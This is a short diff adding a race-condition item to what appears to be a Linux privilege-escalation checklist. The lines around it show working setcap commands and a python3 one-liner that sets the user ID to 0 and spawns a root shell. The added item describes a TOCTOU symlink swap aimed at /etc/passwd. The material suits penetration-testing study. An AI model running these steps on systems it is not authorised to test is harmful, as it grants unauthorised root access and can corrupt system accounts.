@@ -59,3 +59,7 @@ setcap cap_setuid+ep ~/python3
 sudo setcap cap_setuid+ep ~/python3
 - [ ] The first setcap when setcap is SUID, the second when sudo -l allows it
 ~/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+## Race conditions
+
+- [ ] Root-owned script editing a file you can reach? Race it: swap the target with a symlink to /etc/passwd between its check and its write (TOCTOU)
